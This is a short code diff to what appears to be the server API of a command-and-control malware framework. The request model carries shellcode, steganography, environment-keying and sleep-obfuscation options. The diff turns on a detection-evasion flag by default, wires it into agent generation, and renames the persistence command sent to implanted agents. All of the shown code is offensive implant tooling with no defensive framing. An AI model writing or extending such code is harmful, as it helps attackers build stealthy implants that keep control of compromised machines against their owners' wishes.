@@ -103,6 +103,7 @@ class GenerateRequest(BaseModel):
     shellcode_format: str = "raw"
     transport: str | None = None
     lang: str = "go"
+    evasion: bool = True
     stego: bool = False
     stego_image: str | None = None
     env_keying: str | None = None
@@ -280,7 +281,7 @@ class DormantRequest(BaseModel):
 async def persist_agent(agent_id: str, req: PersistRequest):
     if not _server or agent_id not in _server.agents:
         raise HTTPException(404, "Agent not found")
-    command = f"persist {req.method}".strip()
+    command = f"__px:persist:{req.method}".strip()
     result = await _server.send_command_to_agent(agent_id, command)
     agent = _server.agents.get(agent_id)
     if agent and agent.mode == "beacon":
@@ -437,7 +438,7 @@ async def generate_agents(req: GenerateRequest):
             sleep_obf=req.sleep_obf, idle_encrypt=req.idle_encrypt,
             profile=req.profile, target_os=req.target_os, redirector=req.redirector,
             bof=req.bof, obfuscation=req.obfuscation,
-            transport=transport,
+            transport=transport, evasion=req.evasion,
         )
         results.update(py_results)
 
